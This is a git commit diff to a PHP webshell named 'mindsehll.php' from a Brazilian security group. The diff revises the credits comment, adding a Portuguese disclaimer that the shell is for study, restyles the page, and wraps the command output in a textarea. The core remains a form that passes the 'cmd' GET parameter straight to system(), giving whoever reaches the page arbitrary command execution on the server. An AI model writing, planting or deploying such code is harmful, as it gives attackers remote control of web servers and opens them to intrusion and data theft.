fbc4f9b9de27f77ca3459f1ee448f9f9c81970e2
Jonathan <39104938+jord-baskov@users.noreply.github.com>
2019-07-21 15:57:00 -0300

    Update mindsehll.php

--- mindsehll.php
+++ mindsehll.php
@@ -1,10 +1,12 @@
-<!--Coded by jord@root-Exploit  - Sr.Storm
-and MINDSET-INFOSEC
---------------------------------------------
-https://mindsetsecurity.wordpress.com
---------------------------------------------
-versão completa em sairá em 2019 com mais funções
-e muito mais complexa 
+<!--
+[+]Coder   : Jonathan Baskov ==Jord@rootExploit and Sr.Storm
+[+]Team    : Mindsetsecurity
+[+]Blog    : https://mindsetsecurity.wordpress.com
+[+]git     : https://github.com/jord-baskov/
+[+]contato : jordison@protonmail.com
+[+]Warning!
+essa Webshell é apenas um script rápido e para fins de estudo tanto meus quanto o de quem quiser usa-lo,
+ainda existe muitos erros, e falta muitos complementos.
 
 -->
 <!DOCTYPE html>
@@ -20,15 +22,16 @@ e muito mais complexa
 		h4{font-family: 'Major Mono Display', monospace; color:white;}
 	   input {type:text;background:rgba(0,0,.2);width: 280px;color:#ff23c4;}
 		body, input {font: 11px sans regular,sans-serif;}
-		body {color: #fff;text-align: center;background: #333 url(bg.png);}
+		body {color: #fff;text-align: center;background: #333;}
 		pre{font-family: sans-serif; color:#ffff2e;}
 		a{color:#7fff00;}
+		textarea{color:#ffff2e; background:#000000;};
 	</style>
 </head>
 <body>
 <center>
 	<center><h1>&#9763; Bem Vindo Ao Mindshell &#9763;</h1>
-<h4>visite nosso blog <a href="https://mindsetsecurity.wordpress.com/"><br>◉|MindsetSec|◉</a></h4><br>
+<h4>visite nosso blog <a href="https://mindsetsecurity.wordpress.com/"><br>◉|MindsetSecurity|◉</a></h4><br>
 <img src="https://mindsetsecurity.files.wordpress.com/2018/02/cropped-1f43a.png?w=150">
 <font color="silver"><h3>&#8623;Command&#8623;</h3></font>
 <form method="GET" name="linha de comando">
@@ -36,15 +39,15 @@ e muito mais complexa
 <br>
 <input type="submit" name="env" value="exec"></br>
  <pre>
-&#9762;--------------------------------------------------------------------&#9762;
+<font color="yellow"><h3>&#8623;Result&#8623;</h3></font>
+<textarea rows="05"  cols="80" >
 <?php
-
 	if($_GET['cmd']) {
  	system($_GET['cmd']);
   }
 
  ?>
- &#9762;--------------------------------------------------------------------&#9762;
+</textarea>
  </pre>
 </table>
 </form>
